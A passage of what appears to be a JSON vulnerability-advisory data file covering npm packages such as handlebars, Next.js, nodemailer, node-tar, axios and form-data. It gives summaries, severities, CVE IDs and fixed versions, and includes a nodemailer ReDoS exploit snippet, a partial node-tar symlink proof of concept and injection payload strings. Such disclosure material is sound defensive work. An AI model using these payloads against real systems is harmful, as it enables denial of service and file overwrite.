+  "details": "## Summary\n\nWhen a Handlebars template contains decorator syntax referencing an unregistered decorator (e.g. `{{*n}}`), the compiled template calls `lookupProperty(decorators, \"n\")`, which returns `undefined`. The runtime then immediately invokes the result as a function, causing an unhandled `TypeError: ... is not a function` that crashes the Node.js process. Any application that compiles user-supplied templates without wrapping the call in a `try/catch` is vulnerable to a single-request Denial of Service.\n\n## Description\n\nIn `lib/handlebars/compiler/javascript-compiler.js`, the code generated for a decorator invocation looks like:\n\n```javascript\nfn = lookupProperty(decorators, \"n\")(fn, props, container, options) || fn;\n```\n\nWhen `\"n\"` is not a registered decorator, `lookupProperty(decorators, \"n\")` returns `undefined`. The expression immediately attempts to call `undefined` as a function, producing:\n\n```\nTypeError: lookupProperty(...) is not a function\n```\n\nBecause the error is thrown inside the compiled template function and is not caught by the runtime, it propagates up as an unhandled exception and — when not caught by the application — crashes the Node.js process.\n\nThis incon",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-33939"
+  ],
+  "published": "2026-03-27T18:21:15Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33939",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-9g9p-9gw9-jx7f",
+  "summary": "Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration",
+  "details": "A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\n\nStrongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-59471"
+  ],
+  "published": "2026-01-27T19:18:25Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59471",
+  "fixed": [
+   "next@15.5.10",
+   "next@16.1.5"
+  ]
+ },
+ {
+  "id": "GHSA-9h6g-pr28-7cqp",
+  "summary": "nodemailer ReDoS when trying to send a specially crafted email",
+  "details": "### Summary\nA ReDoS vulnerability occurs when nodemailer tries to parse img files with the parameter `attachDataUrls` set, causing the stuck of event loop. \nAnother flaw was found when nodemailer tries to parse an attachments with a embedded file, causing the stuck of event loop. \n\n### Details\n\nRegex: /^data:((?:[^;]*;)*(?:[^,]*)),(.*)$/\n\nPath: compile -> getAttachments -> _processDataUrl\n\nRegex: /(<img\\b[^>]* src\\s*=[\\s\"']*)(data:([^;]+);[^\"'>\\s]+)/\n\nPath: _convertDataImages\n\n### PoC\n\nhttps://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6\nhttps://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698\n\n```js\nasync function exploit() {\n   const MailComposer = require(\\\"nodemailer/lib/mail-composer\\\");\n   const MailComposerObject = new MailComposer();\n\n   // Create a malicious data URL that will cause excessive backtracking\n   // This data URL is crafted to have a long sequence of characters that will cause the regex to backtrack\n   const maliciousDataUrl = 'data:image/png;base64,' + 'A;B;C;D;E;F;G;H;I;J;K;L;M;N;O;P;Q;R;S;T;U;V;W;X;Y;Z;'.repeat(1000) + '==';\n\n   // Call the vulnerable method with the crafted input\n   const result = await MailComposerObject._proc",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2024-58379"
+  ],
+  "published": "2024-01-31T22:42:54Z",
+  "url": "https://osv.dev/vulnerability/GHSA-9h6g-pr28-7cqp",
+  "fixed": [
+   "nodemailer@6.9.9"
+  ]
+ },
+ {
+  "id": "GHSA-9ppj-qmqm-q256",
+  "summary": "node-tar Symlink Path Traversal via Drive-Relative Linkpath",
+  "details": "### Summary\n`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.\n\n### Details\nThe extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.\n\nWhat happens with `linkpath: \"C:../../../target.txt\"`:\n1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.\n2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.\n3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.\n4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).\n\nThis is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.\n\n### PoC\nTested on Arch Linux with `tar@7.5.10`.\n\nPoC script (`poc.cjs`):\n\n```js\nconst fs = require('fs')\nconst path = require('path')\nconst { Header, ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-31802"
+  ],
+  "published": "2026-03-10T23:44:58Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-31802",
+  "fixed": [
+   "tar@7.5.11"
+  ]
+ },
+ {
+  "id": "GHSA-9r2w-394v-53qc",
+  "summary": "Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links",
+  "details": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\\` and `/` characters as path separators, however `\\` is a valid filename character on posix systems.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nAdditionally, a si",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-37701"
+  ],
+  "published": "2021-08-31T16:05:27Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-37701",
+  "fixed": [
+   "tar@4.4.16",
+   "tar@5.0.8",
+   "tar@6.1.7"
+  ]
+ },
+ {
+  "id": "GHSA-9wv6-86v2-598j",
+  "summary": "path-to-regexp outputs backtracking regular expressions",
+  "details": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a cus",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-45296",
+   "CVE-2026-4867",
+   "GHSA-37ch-88jc-xwx2"
+  ],
+  "published": "2024-09-09T20:19:15Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45296",
+  "fixed": [
+   "path-to-regexp@1.9.0",
+   "path-to-regexp@0.1.10",
+   "path-to-regexp@8.0.0",
+   "path-to-regexp@3.3.0",
+   "path-to-regexp@6.3.0"
+  ]
+ },
+ {
+  "id": "GHSA-c59h-r6p8-q9wc",
+  "summary": "Next.js missing cache-control header may lead to CDN caching empty reply",
+  "details": "Next.js before 13.4.20-canary.13 lacks a cache-control header and thus empty prefetch responses may sometimes be cached by a CDN, causing a denial of service to all users requesting the same URL via that CDN. Cloudflare considers these requests cacheable assets.",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2023-46298"
+  ],
+  "published": "2023-10-22T03:30:23Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46298",
+  "fixed": [
+   "next@13.4.20-canary.13"
+  ]
+ },
+ {
+  "id": "GHSA-c7w3-x93f-qmm8",
+  "summary": "Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter",
+  "details": "### Summary\nWhen a custom `envelope` object is passed to `sendMail()` with a `size` property containing CRLF characters (`\\r\\n`), the value is concatenated directly into the SMTP `MAIL FROM` command without sanitization. This allows injection of arbitrary SMTP commands, including `RCPT TO` — silently adding attacker-controlled recipients to outgoing emails.\n\n\n### Details\nIn `lib/smtp-connection/index.js` (lines 1161-1162), the `envelope.size` value is concatenated into the SMTP `MAIL FROM` command without any CRLF sanitization:\n\n```javascript\nif (this._envelope.size && this._supportedExtensions.includes('SIZE')) {\n    args.push('SIZE=' + this._envelope.size);\n}\n```\n\nThis contrasts with other envelope parameters in the same function that ARE properly sanitized:\n- **Addresses** (`from`, `to`): validated for `[\\r\\n<>]` at lines 1107-1127\n- **DSN parameters** (`dsn.ret`, `dsn.envid`, `dsn.orcpt`): encoded via `encodeXText()` at lines 1167-1183\n\nThe `size` property reaches this code path through `MimeNode.setEnvelope()` in `lib/mime-node/index.js` (lines 854-858), which copies all non-standard envelope properties verbatim:\n\n```javascript\nconst standardFields = ['to', 'cc', 'bcc', 'from'",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2026-82854"
+  ],
+  "published": "2026-03-26T22:26:46Z",
+  "url": "https://osv.dev/vulnerability/GHSA-c7w3-x93f-qmm8",
+  "fixed": [
+   "nodemailer@8.0.4"
+  ]
+ },
+ {
+  "id": "GHSA-cm22-4g7w-348p",
+  "summary": "serve-static vulnerable to template injection that can lead to XSS",
+  "details": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in serve-static 1.16.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2024-43800"
+  ],
+  "published": "2024-09-10T19:42:33Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43800",
+  "fixed": [
+   "serve-static@1.16.0",
+   "serve-static@2.1.0"
+  ]
+ },
+ {
+  "id": "GHSA-cph5-m8f7-6c5x",
+  "summary": "axios Inefficient Regular Expression Complexity vulnerability",
+  "details": "axios before v0.21.2 is vulnerable to Inefficient Regular Expression Complexity.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2021-3749"
+  ],
+  "published": "2021-09-01T18:23:02Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-3749",
+  "fixed": [
+   "axios@0.21.2"
+  ]
+ },
+ {
+  "id": "GHSA-f23m-r3pf-42rh",
+  "summary": "lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`",
+  "details": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-2950"
+  ],
+  "published": "2026-04-01T23:50:27Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-2950",
+  "fixed": [
+   "lodash@4.18.0",
+   "lodash-es@4.18.0",
+   "lodash-amd@4.18.0",
+   "lodash.unset@4.18.0"
+  ]
+ },
+ {
+  "id": "GHSA-f2jv-r9rf-7988",
+  "summary": "Remote code execution in handlebars when compiling templates",
+  "details": "The package handlebars before 4.7.7 are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2021-23369"
+  ],
+  "published": "2021-05-06T15:57:44Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23369",
+  "fixed": [
+   "handlebars@4.7.7",
+   "org.webjars:handlebars@4.7.7",
+   "org.webjars.npm:handlebars@4.7.7",
+   "org.webjars.bowergithub.wycats:handlebars.js@4.7.7"
+  ]
+ },
+ {
+  "id": "GHSA-f5x3-32g6-xq36",
+  "summary": "Denial of service while parsing a tar file due to lack of folders count validation",
+  "details": "## Description: \nDuring some analysis today on npm's `node-tar` package I came across the folder creation process, Basicly if you provide node-tar with a path like this `./a/b/c/foo.txt` it would create every folder and sub-folder here a, b and c until it reaches the last folder to create `foo.txt`, In-this case I noticed that there's no validation at all on the amount of folders being created, that said we're actually able to CPU and memory consume the system running node-tar and even crash the nodejs client within few seconds of running it using a path with too many sub-folders inside\n\n## Steps To Reproduce:\nYou can reproduce this issue by downloading the tar file I provided in the resources and using node-tar to extract it, you should get the same behavior as the video\n\n## Proof Of Concept:\nHere's a [video](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3i7uojw8s52psar6pg8zkdo4h9io?response-content-disposition=attachment%3B%20filename%3D%22tar-dos-poc.webm%22%3B%20filename%2A%3DUTF-8%27%27tar-dos-poc.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSWWGDXHA%2F20240312%2Fus-west-2%2Fs3%2Faws4_requ",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2024-28863"
+  ],
+  "published": "2024-03-22T16:57:05Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28863",
+  "fixed": [
+   "node-tar@6.2.1",
+   "tar@6.2.1"
+  ]
+ },
+ {
+  "id": "GHSA-f82v-jwr5-mffw",
+  "summary": "Authorization Bypass in Next.js Middleware",
+  "details": "# Impact\nIt is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.\n\n# Patches\n* For Next.js 15.x, this issue is fixed in `15.2.3`\n* For Next.js 14.x, this issue is fixed in `14.2.25`\n* For Next.js 13.x, this issue is fixed in 13.5.9\n* For Next.js 12.x, this issue is fixed in 12.3.5\n* For Next.js 11.x, consult the below workaround.\n\n_Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability._\n\n# Workaround\nIf patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.\n\n## Credits\n\n- Allam Rachid (zhero;)\n- Allam Yasser (inzo_)",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2025-29927"
+  ],
+  "published": "2025-03-21T15:20:12Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-29927",
+  "fixed": [
+   "next@13.5.9",
+   "next@14.2.25",
+   "next@15.2.3",
+   "next@12.3.5"
+  ]
+ },
+ {
+  "id": "GHSA-fjxv-7rqg-78g4",
+  "summary": "form-data uses unsafe random function in form-data for choosing boundary",
+  "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/l",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2025-7783"
+  ],
+  "published": "2025-07-21T19:04:54Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7783",
+  "fixed": [
+   "form-data@2.5.4",
+   "form-data@3.0.4",
+   "form-data@4.0.4"
+  ]
+ },
+ {
+  "id": "GHSA-fvcv-3m26-pcqx",
+  "summary": "Axios has Unrestricted Cloud Metadata Exfiltration via Header Injection Chain",
+  "details": "# Vulnerability Disclosure: Unrestricted Cloud Metadata Exfiltration via Header Injection Chain\n\n## Summary\nThe Axios library is vulnerable to a specific gadget-style attack chain in which **prototype pollution** in a third-party dependency may be leveraged to inject unsanitized header values into outbound requests.\n\nAxios can be used as a gadget after pollution occurs elsewhere because header values merged from attacker-controlled prototype properties are not sanitized for CRLF (`\\r\\n`) characters before being written to the request. In affected deployments, this may enable limited request manipulation or metadata access as part of a higher-complexity exploit chain.\n\n**Severity**: Moderate (CVSS 3.1 Base Score: 4.8)\n**Affected Versions**: All versions (v0.x - v1.x)\n**Vulnerable Component**: `lib/adapters/http.js` (Header Processing)\n\n## Usage of \\\"Helper\\\" Vulnerabilities\nThis issue requires a separate **prototype pollution** vulnerability in another library in the application stack (for example, `qs`, `minimist`, `ini`, or `body-parser`). If an attacker can pollute `Object.prototype`, Axios may pick up the polluted properties during config merge.\n\nBecause Axios does not sanitise ",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-40175"
+  ],
+  "published": "2026-04-10T19:47:16Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-40175",
+  "fixed": [
+   "axios@1.15.0",
+   "axios@0.31.0"
+  ]
+ },
+ {
+  "id": "GHSA-fxqj-rqcc-2cmp",
+  "summary": "PostCSS: incomplete fix of GHSA-6g55-p6wh-862q — attacker-controlled sourceMappingURL reads arbitrary .map files when `from` is unset",
+  "details": "## Summary\n\nThe fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.\n\n`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.\n\n## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)\n\n```js\n// lib/previous-map.js\nloadFile(path, cssFile, trus",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-69153"
+  ],
+  "published": "2026-08-03T17:11:39Z",
+  "url": "https://osv.dev/vulnerability/GHSA-fxqj-rqcc-2cmp",
+  "fixed": [
+   "postcss@8.5.23"
+  ]
+ },
+ {
+  "id": "GHSA-g5qg-72qw-gw5v",
+  "summary": "Next.js Affected by Cache Key Confusion for Image Optimization API Routes",
+  "details": "A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.\n\nAll users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-57752"
+  ],
+  "published": "2025-08-29T22:06:22Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57752",
+  "fixed": [
+   "next@14.2.31",
+   "next@15.4.5"
+  ]
+ },
+ {
+  "id": "GHSA-g77x-44xx-532m",
+  "summary": "Denial of Service condition in Next.js image optimization",
+  "details": "### Impact\nThe image optimization feature of Next.js contained a vulnerability which allowed for a potential Denial of Service (DoS) condition which could lead to excessive CPU consumption.\n\n**Not affected:**\n- The `next.config.js` file is configured with `images.unoptimized` set to `true` or `images.loader` set to a non-default value.\n- The Next.js application is hosted on Vercel. \n\n### Patches\nThis issue was fully patched in Next.js `14.2.7`. We recommend that users upgrade to at least this version.\n\n### Workarounds\nEnsure that the `next.config.js` file has either `images.unoptimized`, `images.loader` or `images.loaderFile` assigned.\n\n#### Credits\nBrandon Dahler (brandondahler), AWS\nDimitrios Vlastaras",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2024-47831"
+  ],
+  "published": "2024-10-14T19:45:21Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47831",
+  "fixed": [
+   "next@14.2.7"
+  ]
+ },
+ {
+  "id": "GHSA-ggv3-7p47-pfv8",
+  "summary": "Next.js: HTTP request smuggling in rewrites",
+  "details": "## Summary\nWhen Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes.\n\n## Impact\nAn attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel. \n\n## Patches\nThe vulnerability originated in an upstream library vendored by Next.js. It is fixed by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path.\n\n## Workarounds\nIf upgrade is not immediately possible:\n- Block chunked `DELETE`/`OPTIONS` requests on rewritten routes at your edge/proxy.\n- Enforce authentication/authorization on backend routes per our [security guidance](https://nextjs.org/docs/app/guides/data-security).",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-29057"
+  ],
+  "published": "2026-03-17T16:17:15Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-29057",
+  "fixed": [
+   "next@16.1.7",
+   "next@15.5.13"
+  ]
+ },
+ {
+  "id": "GHSA-grv7-fg5c-xmjg",
+  "summary": "Uncontrolled resource consumption in braces",
+  "details": "The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends \"imbalanced braces\" as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.\n",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-4068"
+  ],
+  "published": "2024-05-14T18:30:54Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4068",
+  "fixed": [
+   "braces@3.0.3"
+  ]
+ },
+ {
+  "id": "GHSA-gvwx-54wh-qm9j",
+  "summary": "node-tar: Uncaught Exception DoS via NUL byte in PAX path/linkpath records",
+  "details": "## Summary\n\n`node-tar` strips trailing `NUL` bytes from long-name (`L`) and long-linkpath (`K`) GNU extended headers but does **not** apply the same sanitization to equivalent fields delivered via PAX (`x` typeflag) extended headers. A PAX record of the form `path=visible.txt\\x00hidden.txt` is parsed verbatim into `entry.path` and flows into `fs.lstat()` / `fs.open()`, which Node.js core rejects with `ERR_INVALID_ARG_VALUE`. The throw originates inside an `FSReqCallback` async chain that is **not** wrapped by the consumer's `await/try-catch` around `tar.x()` — it surfaces as `uncaughtException` and terminates the process.\n\nThis is a remote denial-of-service primitive against any process that extracts attacker-supplied tarballs through `tar.x` / `tar.extract` / `tar.t` / `tar.Parser`, even when the consumer follows the documented `try/catch` error-handling pattern.\n\nA secondary parser-differential (CWE-436) exists because `tar(1)`, `bsdtar`, and Python `tarfile` truncate the path at the first `NUL` (yielding `visible.txt`) while node-tar retains the full string. A validator that pre-scans a tarball with one tool and extracts with the other is bypassed.\n\n---\n\n## Root cause\n\n### Vulne",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-59875"
+  ],
+  "published": "2026-07-20T21:51:12Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59875",
+  "fixed": [
+   "tar@7.5.17"
+  ]
+ },
+ {
+  "id": "GHSA-h64f-5h5j-jqjh",
+  "summary": "Next.js has a Denial of Service in the Image Optimization API",
+  "details": "### Impact\n\nWhen self-hosting Next.js with the default image loader, the Image Optimization API fetches local images entirely into memory without enforcing a maximum size limit. An attacker could cause out-of-memory conditions by requesting large local assets from the `/_next/image` endpoint that match the `images.localPatterns` configuration (by default, all patterns are allowed).\n\n- If you are using `images.localPatterns`, only the patterns in that array are impacted.\n- If you are using `images.unoptimized: true`, you are NOT impacted.\n- If you are using `images.loader: 'custom'`, you are NOT impacted.\n- If you are using Vercel, you are NOT impacted.\n\n### Fix\n\nWe now apply response size limits consistently to internal image fetches, not just external ones, and fail oversized responses before they can exhaust process memory.\n\nThis can be adjusted using the `images.maximumResponseBody` configuration.\n\n### Workarounds\n\nIf you cannot upgrade immediately, avoid routing large local assets through `/_next/image`, disable image optimization for large or untrusted local files, or block image optimization access to those assets at the edge.\n\nYou can disable using the `images.localPatterns:",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-44577"
+  ],
+  "published": "2026-05-11T15:56:05Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44577",
+  "fixed": [
+   "next@15.5.16",
+   "next@16.2.5"
+  ]
+ },
+ {
+  "id": "GHSA-hfxv-24rg-xrqf",
+  "summary": "Axios: Regular Expression Denial of Service (ReDoS) via Cookie Name Injection",
+  "details": "## Summary\n\nAxios versions before `0.32.0` on the `0.x` line and before `1.16.0` on the `1.x` line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads `document.cookie`.\n\nThe practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read `document.cookie`.\n\n## Impact\n\nApplications are affected only when attacker-controlled data can reach the XSRF cookie name configuration or a direct/unsafe call to the internal cookie helper.\n\nThis does not expose credentials, modify requests, or affect response integrity. The impact is availability only.\n\n## Affected Functionality\n\nAffected code paths:\n\n- `lib/helpers/cookies.js` `read(name)` in standard browser environments.\n- `lib/helpers/resolveConfig.js` in `1.x`, when browser XHR/fetch adapters resolve XSRF config.\n- `lib/adapters/xhr.js` in `0.x`, when the ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-44496"
+  ],
+  "published": "2026-06-04T14:24:06Z",
+  "url": "https://osv.dev/vulnerability/GHSA-hfxv-24rg-xrqf",
+  "fixed": [
+   "axios@1.16.0",
+   "axios@0.32.0"
+  ]
+ },
+ {
+  "id": "GHSA-hjrf-2m68-5959",
+  "summary": "jsonwebtoken's insecure implementation of key retrieval function could lead to Forgeable Public/Private Tokens from RSA to HMAC",
+  "details": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library can be misconfigured so that passing a poorly implemented key retrieval function (referring to the `secretOrPublicKey` argument from the [readme link](https://github.com/auth0/node-jsonwebtoken#jwtverifytoken-secretorpublickey-options-callback)) will result in incorrect verification of tokens. There is a possibility of using a different algorithm and key combination in verification  than the one that was used to sign the tokens. Specifically, tokens signed with an asymmetric public key could be verified with a symmetric HS256 algorithm. This can lead to successful validation of forged tokens. \n\n# Am I affected?\n\nYou will be affected if your application is supporting usage of both symmetric key and asymmetric key in jwt.verify() implementation with the same key retrieval function. \n\n# How do I fix it?\n \nUpdate to version 9.0.0.\n\n# Will the fix impact my users?\n\nThere is no impact for end users",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2022-23541"
+  ],
+  "published": "2022-12-22T03:33:19Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23541",
+  "fixed": [
+   "jsonwebtoken@9.0.0"
+  ]
+ },
+ {
+  "id": "GHSA-hmw2-7cc7-3qxx",
+  "summary": "form-data: CRLF injection in form-data via unescaped multipart field names and filenames",
+  "details": "## Summary\n\n`form-data` builds `multipart/form-data` request bodies. Through v4.0.5, the `field` name passed to `FormData#append` and the `filename` option are concatenated directly into the `Content-Disposition` header with no escaping of CR (`\\r`), LF (`\\n`), or `\"`. An application that uses **untrusted input as a field name or filename** therefore lets an attacker terminate the header line and either inject additional headers or smuggle whole additional multipart parts into the request the application forwards to a backend.\n\nThis is CWE-93 (CRLF injection). It is a divergence from how browsers and the WHATWG HTML spec serialize form-data (they escape these characters), so the fix is to match that behavior. Severity is **conditional**: it depends on the consuming application passing attacker-controlled data as a field name or filename. Applications that only use fixed/trusted field names are not affected.\n\n## Details\n\nIn `lib/form_data.js`, `_multiPartHeader` builds the part header as:\n\n```javascript\n'Content-Disposition': ['form-data', 'name=\"' + field + '\"'].concat(contentDisposition || [])\n```\n\nand `_getContentDisposition` builds `filename=\"' + filename + '\"'`. Neither escapes",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-12143"
+  ],
